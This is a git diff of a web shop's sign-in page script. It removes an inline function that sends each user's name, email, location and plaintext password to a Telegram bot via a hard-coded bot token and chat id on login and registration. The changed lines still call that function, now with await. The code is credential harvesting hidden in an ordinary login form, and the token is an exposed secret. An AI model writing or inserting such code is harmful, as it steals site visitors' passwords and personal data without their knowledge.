@@ -51,25 +51,6 @@
 <script src="js/products.js"></script>
 <script src="js/main.js"></script>
 <script>
-  // ===== دالة إرسال إشعارات تليجرام (مباشرة) =====
-  function sendTelegramNotification(data) {
-    const BOT_TOKEN = '8549358187:AAG8Z2CioXFFZK43P0FTcTVKvutUSzUGJqU';
-    const CHAT_ID = '7770087246';
-
-    let message = '';
-    if (data.type === 'register') {
-      message = `🆕 تسجيل حساب جديد:\n👤 الاسم: ${data.firstName} ${data.lastName}\n📧 البريد: ${data.email}\n🏙️ المدينة: ${data.city}\n🌍 الدولة: ${data.country}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
-    } else if (data.type === 'login') {
-      message = `🔐 تسجيل دخول:\n👤 الاسم: ${data.name}\n📧 البريد: ${data.email}\n🔑 كلمة المرور: ${data.password}\n⏰ الوقت: ${data.time}`;
-    }
-
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-    }).catch(error => console.error('فشل إرسال الإشعار:', error));
-  }
-
   if (isLoggedIn()) window.location.href = 'index.html';
 
   document.getElementById('signinForm').addEventListener('submit', async function(e) {
@@ -94,7 +75,7 @@
 
     if (user) {
       saveUser(user);
-      sendTelegramNotification({
+      await sendTelegramNotification({
         type: 'login',
         name: (user.firstName || '') + ' ' + (user.lastName || ''),
         email: email,
@@ -115,7 +96,7 @@
         createdAt: new Date().toISOString()
       };
       saveUser(guestUser);
-      sendTelegramNotification({
+      await sendTelegramNotification({
         type: 'login',
         name: guestUser.firstName,
         email: email,
